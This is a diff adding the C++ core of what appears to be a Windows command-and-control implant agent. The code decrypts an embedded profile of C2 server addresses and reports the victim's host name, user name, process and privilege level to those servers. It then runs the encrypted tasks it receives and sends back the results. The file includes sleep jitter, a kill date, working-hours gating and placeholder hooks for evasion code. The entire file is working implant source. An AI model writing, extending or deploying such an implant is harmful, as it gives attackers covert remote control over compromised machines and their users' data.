@@ -1,0 +1,383 @@
+#include "Agent.h"
+#include "Commander.h"
+#include "ConnectorTCP.h"
+#include "JobsController.h"
+#include "Downloader.h"
+#include "RuntimeCommon.h"
+#include "../protocol/protocol.h"
+#include "../crypto/crypto.h"
+// __EVASION_INCLUDE__
+
+#include <stdint.h>
+#include <string.h>
+#include <stdlib.h>
+#include <time.h>
+
+#include <string>
+#include <vector>
+
+namespace {
+
+static bool winsockReady = false;
+
+static std::string ipv4ToString(uint32_t ip)
+{
+    char buf[32];
+    snprintf(buf, sizeof(buf), "%u.%u.%u.%u",
+        (unsigned)((ip >> 24) & 0xff),
+        (unsigned)((ip >> 16) & 0xff),
+        (unsigned)((ip >> 8) & 0xff),
+        (unsigned)(ip & 0xff));
+    return std::string(buf);
+}
+
+static bool startupWinsock()
+{
+    if (winsockReady) {
+        return true;
+    }
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return false;
+    }
+    winsockReady = true;
+    return true;
+}
+
+static bool splitHostPort(const std::string& address, std::string* host, std::string* port)
+{
+    if (!host || !port) {
+        return false;
+    }
+    size_t pos = address.rfind(':');
+    if (pos == std::string::npos || pos == 0 || pos + 1 >= address.size()) {
+        return false;
+    }
+    *host = address.substr(0, pos);
+    *port = address.substr(pos + 1);
+    return true;
+}
+
+static SOCKET connectAddress(const std::string& address, int timeoutSecs)
+{
+    std::string host;
+    std::string port;
+    if (!splitHostPort(address, &host, &port)) {
+        return INVALID_SOCKET;
+    }
+
+    addrinfo hints = {};
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    addrinfo* results = nullptr;
+    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &results) != 0) {
+        return INVALID_SOCKET;
+    }
+
+    SOCKET sock = INVALID_SOCKET;
+    for (addrinfo* it = results; it != nullptr; it = it->ai_next) {
+        sock = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
+        if (sock == INVALID_SOCKET) {
+            continue;
+        }
+
+        int timeoutMs = timeoutSecs > 0 ? timeoutSecs * 1000 : 10000;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeoutMs, sizeof(timeoutMs));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeoutMs, sizeof(timeoutMs));
+
+        if (connect(sock, it->ai_addr, (int)it->ai_addrlen) == 0) {
+            break;
+        }
+
+        closesocket(sock);
+        sock = INVALID_SOCKET;
+    }
+
+    freeaddrinfo(results);
+    return sock;
+}
+
+static bool parseProfileBlob(const uint8_t* blob, uint32_t blobSize, gopher_proto::Profile* outProfile, BYTE** outKey)
+{
+    if (!blob || blobSize <= GOPHER_KEY_SIZE || !outProfile || !outKey) {
+        return false;
+    }
+
+    BYTE* key = (BYTE*)LocalAlloc(LPTR, GOPHER_KEY_SIZE);
+    if (!key) {
+        return false;
+    }
+    memcpy(key, blob, GOPHER_KEY_SIZE);
+
+    uint32_t profileLen = 0;
+    uint8_t* profilePlain = DecryptData(blob + GOPHER_KEY_SIZE, blobSize - GOPHER_KEY_SIZE, key, GOPHER_KEY_SIZE, &profileLen);
+    if (!profilePlain) {
+        LocalFree(key);
+        return false;
+    }
+
+    bool ok = gopher_proto::DecodeProfile(profilePlain, profileLen, outProfile);
+    free(profilePlain);
+    if (!ok) {
+        LocalFree(key);
+        return false;
+    }
+
+    *outKey = key;
+    return true;
+}
+
+} // namespace
+
+Agent::Agent()
+{
+    srand((unsigned int)time(nullptr));
+
+    commander  = new Commander(this);
+    connector  = new ConnectorTCP();
+    jobs       = new JobsController();
+    downloader = new Downloader();
+
+    // __EVASION_CTOR__
+}
+
+Agent::~Agent()
+{
+    if (commander)  { delete commander;  commander = nullptr; }
+    if (connector)  { delete connector;  connector = nullptr; }
+    if (jobs)       { delete jobs;       jobs = nullptr; }
+    if (downloader) { delete downloader; downloader = nullptr; }
+    if (sessionKey) { LocalFree(sessionKey); sessionKey = nullptr; }
+}
+
+void Agent::Run(void* profileBlob, ULONG profileSize)
+{
+    if (!commander || !startupWinsock()) {
+        return;
+    }
+
+    gopher_proto::Profile profile;
+    BYTE* key = nullptr;
+    if (!parseProfileBlob((const uint8_t*)profileBlob, profileSize, &profile, &key)) {
+        return;
+    }
+
+    if (sessionKey) {
+        LocalFree(sessionKey);
+    }
+    sessionKey = key;
+
+    sleepMs = (profile.sleep > 0 ? (ULONG)profile.sleep : 5UL) * 1000UL;
+    jitter = profile.jitter > 0 ? (ULONG)profile.jitter : 0UL;
+    killDate = profile.killDate;
+    workStart = profile.workStart;
+    workEnd = profile.workEnd;
+
+    size_t index = 0;
+    int attempts = 0;
+
+    while (active && !ShouldExit()) {
+        if (profile.addresses.empty()) {
+            break;
+        }
+
+        WaitForWorkingHours();
+
+        const std::string address = profile.addresses[index % profile.addresses.size()];
+        index++;
+        attempts++;
+
+        SOCKET sock = connectAddress(address, profile.connTimeout > 0 ? profile.connTimeout : 10);
+        if (sock == INVALID_SOCKET) {
+            SleepWithJitter();
+            if (profile.connCount > 0 && attempts >= profile.connCount) {
+                break;
+            }
+            continue;
+        }
+        attempts = 0;
+
+        ULONG beatSize = 0;
+        BYTE* beat = BuildBeat(&beatSize);
+        if (!beat || beatSize == 0) {
+            if (beat) {
+                LocalFree(beat);
+            }
+            closesocket(sock);
+            break;
+        }
+
+        std::vector<uint8_t> beatVec(beat, beat + beatSize);
+        LocalFree(beat);
+
+        std::vector<uint8_t> initPack;
+        std::vector<uint8_t> startMsg;
+        uint32_t agentId = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
+        if (!gopher_proto::EncodeInitPack(agentId, profile.type, beatVec, &initPack) ||
+            !gopher_proto::EncodeStartMsg(gopher_proto::INIT_PACK, initPack, &startMsg)) {
+            closesocket(sock);
+            break;
+        }
+
+        uint32_t encLen = 0;
+        uint8_t* encInit = EncryptData(startMsg.data(), (uint32_t)startMsg.size(), sessionKey, GOPHER_KEY_SIZE, &encLen);
+        if (!encInit || !gopher_proto::TcpSendMsg(sock, encInit, encLen)) {
+            if (encInit) {
+                free(encInit);
+            }
+            closesocket(sock);
+            SleepWithJitter();
+            continue;
+        }
+        free(encInit);
+
+        while (active && !ShouldExit()) {
+            WaitForWorkingHours();
+
+            std::vector<uint8_t> cipherIn;
+            if (!gopher_proto::TcpRecvMsg(sock, &cipherIn) || cipherIn.empty()) {
+                break;
+            }
+
+            uint32_t plainLen = 0;
+            uint8_t* plain = DecryptData(cipherIn.data(), (uint32_t)cipherIn.size(), sessionKey, GOPHER_KEY_SIZE, &plainLen);
+            if (!plain || plainLen == 0) {
+                if (plain) {
+                    free(plain);
+                }
+                break;
+            }
+
+            const ULONG outCapacity = 32 * 1024 * 1024;
+            BYTE* outBuf = (BYTE*)malloc(outCapacity);
+            ULONG outSize = 0;
+            if (!outBuf) {
+                free(plain);
+                break;
+            }
+
+            commander->ProcessCommandTasks(plain, plainLen, outBuf, &outSize);
+            free(plain);
+
+            if (outSize > 0) {
+                uint32_t sendLen = 0;
+                uint8_t* sendBuf = EncryptData(outBuf, outSize, sessionKey, GOPHER_KEY_SIZE, &sendLen);
+                if (!sendBuf || !gopher_proto::TcpSendMsg(sock, sendBuf, sendLen)) {
+                    if (sendBuf) {
+                        free(sendBuf);
+                    }
+                    free(outBuf);
+                    break;
+                }
+                free(sendBuf);
+            }
+
+            free(outBuf);
+            SleepWithJitter();
+        }
+
+        shutdown(sock, SD_BOTH);
+        closesocket(sock);
+        SleepWithJitter();
+    }
+}
+
+BOOL Agent::IsActive()
+{
+    return active;
+}
+
+BYTE* Agent::BuildBeat(ULONG* size)
+{
+    if (!size) {
+        return nullptr;
+    }
+
+    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+    DWORD computerLen = MAX_COMPUTERNAME_LENGTH + 1;
+    GetComputerNameA(computerName, &computerLen);
+
+    char username[256] = {0};
+    DWORD usernameLen = sizeof(username);
+    GetUserNameA(username, &usernameLen);
+
+    gopher_proto::SessionInfo info;
+    info.process = runtime_common::CurrentProcessName("__NAME__");
+    info.pid = (int32_t)GetCurrentProcessId();
+    info.user = username;
+    info.host = computerName;
+    info.ipaddr = ipv4ToString(runtime_common::LocalIPv4());
+    info.elevated = runtime_common::IsProcessElevated() ? true : false;
+    info.acp = (uint32_t)GetACP();
+    info.oem = (uint32_t)GetOEMCP();
+    info.os = "windows";
+    info.osVersion = "windows";
+    if (sessionKey) {
+        info.encryptKey.assign(sessionKey, sessionKey + GOPHER_KEY_SIZE);
+    }
+
+    std::vector<uint8_t> packed;
+    if (!gopher_proto::EncodeSessionInfo(info, &packed)) {
+        *size = 0;
+        return nullptr;
+    }
+
+    BYTE* out = (BYTE*)LocalAlloc(LPTR, packed.size() > 0 ? packed.size() : 1);
+    if (!out) {
+        *size = 0;
+        return nullptr;
+    }
+    if (!packed.empty()) {
+        memcpy(out, packed.data(), packed.size());
+    }
+    *size = (ULONG)packed.size();
+    return out;
+}
+
+void Agent::SleepWithJitter()
+{
+    ULONG ms = sleepMs;
+    if (jitter > 0 && jitter <= 90) {
+        int pct = (int)(rand() % (jitter * 2 + 1)) - (int)jitter;
+        int adj = (int)ms * pct / 100;
+        int total = (int)ms + adj;
+        if (total < 0) total = 0;
+        ms = (ULONG)total;
+    }
+    Sleep(ms);
+}
+
+BOOL Agent::ShouldExit()
+{
+    if (killDate <= 0) {
+        return FALSE;
+    }
+    return (INT64)time(nullptr) >= killDate ? TRUE : FALSE;
+}
+
+void Agent::WaitForWorkingHours()
+{
+    if (workStart == 0 && workEnd == 0) {
+        return;
+    }
+
+    while (TRUE) {
+        time_t rawTime;
+        time(&rawTime);
+        struct tm* lt = localtime(&rawTime);
+        int hhmm = lt->tm_hour * 100 + lt->tm_min;
+
+        BOOL inWindow = FALSE;
+        if (workStart <= workEnd) {
+            inWindow = (hhmm >= workStart && hhmm < workEnd);
+        } else {
+            inWindow = (hhmm >= workStart || hhmm < workEnd);
+        }
+        if (inWindow) {
+            break;
+        }
+        Sleep(60000);
+    }
+}
